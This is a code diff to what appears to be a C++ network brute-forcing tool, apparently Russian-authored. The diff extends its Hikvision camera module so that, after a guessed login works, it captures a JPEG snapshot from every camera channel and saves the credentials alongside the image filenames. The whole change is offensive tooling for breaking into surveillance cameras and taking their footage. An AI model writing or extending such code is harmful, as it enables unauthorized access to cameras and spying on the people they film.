@@ -6,6 +6,7 @@
 */
 
 #include "include/bruteforce.h"
+#include "lib/HCNetSDK.h"
 #include "ncsock/include/socket.h"
 
 int
@@ -424,6 +425,7 @@ brute_hikvision(const std::string ip, const std::string login, const std::string
 {
 #ifdef HAVE_HIKVISION
   std::string result;
+  std::string screenshotFilename = "screenshot.jpg";
 
   /*Перенаправление лога, потому что он выводит сообщение которое нам не надо.*/
   freopen("/dev/null", "w", stderr);
@@ -446,9 +448,33 @@ brute_hikvision(const std::string ip, const std::string login, const std::string
 
   LONG userId = NET_DVR_Login_V40(&loginInfo, &deviceInfo);
 
-  if (userId < 0) {
+  if (userId < 0)
+  {
     NET_DVR_Cleanup();
     return "";
+  }
+
+  for (int channel = deviceInfo.struDeviceV30.byStartChan; channel < deviceInfo.struDeviceV30.byChanNum + deviceInfo.struDeviceV30.byStartChan; ++channel)
+  {
+        NET_DVR_JPEGPARA jpegPara = {0};
+        jpegPara.wPicQuality = 2;
+        jpegPara.wPicSize = 0;
+
+        char screenshotFilenameBuffer[256];
+        std::string screenshotFilename = "screenshot_" + std::to_string(channel) + ".jpg";
+        strcpy(screenshotFilenameBuffer, screenshotFilename.c_str());
+
+        BOOL captureResult = NET_DVR_CaptureJPEGPicture(userId, channel, &jpegPara, screenshotFilenameBuffer);
+
+        if (captureResult)
+        {
+            std::cout << "Screenshot captured and saved as " << screenshotFilename << std::endl;
+            result += login + ":" + pass + "@" + screenshotFilename + ",";
+        }
+        else
+        {
+            std::cout << "Failed to capture screenshot for channel " << channel << ". Error code: " << NET_DVR_GetLastError() << std::endl;
+        }
   }
 
   result = login + ":" + pass + "@";
